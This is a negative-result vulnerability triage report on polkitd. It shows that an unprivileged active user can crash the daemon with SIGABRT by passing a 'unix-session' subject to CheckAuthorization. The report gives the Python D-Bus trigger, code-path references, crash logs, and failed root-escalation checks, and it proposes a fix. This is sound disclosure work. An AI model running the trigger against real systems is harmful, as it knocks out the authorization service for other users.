# Negative: active unix-session CheckAuthorization ABRT in polkitd

Result: no LPE. A normal active local user can crash the default `polkitd` service by calling `org.freedesktop.PolicyKit1.Authority.CheckAuthorization` with its own active `unix-session` subject, but the effect is a restartable authorization-service crash. No root command ran, no root marker was created, and post-crash root actions stayed gated by polkit.

## Affected default packages

From the target:

```text
polkitd                         124-2ubuntu1.24.04.3
libpolkit-gobject-1-0:arm64     124-2ubuntu1.24.04.3
libpolkit-agent-1-0:arm64       124-2ubuntu1.24.04.3
dbus                            1.14.10-4ubuntu4.1
systemd                         255.4-1ubuntu8.15
```

`gdb` appears in the log only as analysis tooling. It is not part of the default-install proof or exploit path.

## Default reachability proof

`polkit.service` is the default system authorization manager:

```text
Type=dbus
BusName=org.freedesktop.PolicyKit1
ExecStart=/usr/lib/polkit-1/polkitd --no-debug
User=polkitd
NoNewPrivileges=yes
ProtectSystem=strict
RestrictAddressFamilies=AF_UNIX
```

The default system bus exposes `CheckAuthorization` at `/org/freedesktop/PolicyKit1/Authority` with signature `(sa{sv})sa{ss}us -> (bba{ss})`. The trigger uses a normal active TTY session for `uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)`, with no sudo/admin groups.

## Vulnerable code path

Ubuntu source package `policykit-1 124-2ubuntu1.24.04.3`:

- `src/polkit/polkitsubject.c:485-498` parses a client-supplied D-Bus subject of kind `unix-session` and builds a `PolkitUnixSession`.
- `src/polkitbackend/polkitbackendauthority.c:736-798` handles `CheckAuthorization`, parses the subject, and calls the backend authorization check.
- `src/polkitbackend/polkitbackendinteractiveauthority.c:920-999` confirms the caller and supplied active session belong to the same user, then calls `check_authorization_sync`.
- `src/polkitbackend/polkitbackendinteractiveauthority.c:1131-1158` asks the session monitor for the subject's session.
- `src/polkitbackend/polkitbackendsessionmonitor-systemd.c:306-321` supports getting a user for `POLKIT_IS_UNIX_SESSION`.
- `src/polkitbackend/polkitbackendsessionmonitor-systemd.c:358-392` does not support getting a session for a `PolkitUnixSession`: the `else` branch sets `POLKIT_ERROR_NOT_SUPPORTED` but does not `goto out`, then falls through to `g_assert(process != NULL)`.

That assertion produces SIGABRT for an existing active `unix-session`.

## Trigger

Artifact:

```text
pocs/polkit_unix_session_abrt_triage.sh
logs/polkit-unix-session-abrt-triage-20260517.out
```

Minimal unprivileged D-Bus subject:

```python
unix_session = ("unix-session", {"session-id": dbus.String(os.environ["XDG_SESSION_ID"])})
iface.CheckAuthorization(
    unix_session,
    "org.freedesktop.login1.set-self-linger",
    dbus.Dictionary({}, signature="ss"),
    dbus.UInt32(0),
    "polkit-unix-session-abrt"
)
```

The control check using the same active user as `unix-process` succeeded normally:

```text
control-own-unix-process: authorized=True challenge=False details={}
```

The `unix-session` check crashed the authority:

```text
crash-actual-unix-session: EXC DBusException: org.freedesktop.DBus.Error.NoReply
```

GDB attached to the real systemd-managed `polkit.service` caught:

```text
Thread 1 "polkitd" received signal SIGABRT, Aborted.
#3  __GI_abort
#4  g_assertion_message
#5  g_assertion_message_expr
```

Systemd journal for the unmanaged, no-GDB reproduction:

```text
polkit.service: Main process exited, code=killed, status=6/ABRT
polkit.service: Failed with result 'signal'.
Started polkit.service - Authorization Manager.
```

## LPE checks

The probe installed a root-only marker unit:

```text
ExecStart=/bin/sh -c 'id > /root/polkit_unix_session_abrt_triage_root'
```

After crashing polkit, the active user attempted to start it:

```text
POST_CRASH_ROOT_ACTION_ATTEMPT
Call failed: Interactive authentication required.
```

After polkit restarted, `uid=1001(attacker)` attempted the same root action:

```text
Call failed: Interactive authentication required.
attacker_startunit_rc=1
ls: cannot access '/root/polkit_unix_session_abrt_triage_root': No such file or directory
```

No root context was gained; there is no `id` output from root except the absent-marker checks. Because the bug only kills `polkitd` running as the restricted `polkitd` service account, and systemd restarts it with the same D-Bus policy and hardening, this does not count toward the LPE goal.

## Cleanup and health

Final log state:

```text
systemctl is-system-running -> running
systemctl is-active polkit.service -> active
/tmp/polkit-unix-session-abrt-triage -> absent
/run/systemd/system/polkit-unix-session-abrt-triage-marker.service -> absent
/root/polkit_unix_session_abrt_triage_root -> absent
selfauth_profile_absent
```

## Why this was missed by broader sweeps

This is a semantic subject-type mismatch, not a parser crash from malformed D-Bus types. The supplied subject is well-formed and must name a real active logind session so that the user lookup passes before the later "get session for subject" helper hits its unsupported-subject assertion.

## Suggested fix

In `polkit_backend_session_monitor_get_session_for_subject()`, return immediately after setting `POLKIT_ERROR_NOT_SUPPORTED` for unsupported subject types, or explicitly accept `POLKIT_IS_UNIX_SESSION` by returning a referenced/new session object. Add a regression test that calls `CheckAuthorization` with an actual active `unix-session` subject and verifies a normal authorization result or clean D-Bus error, not process termination.
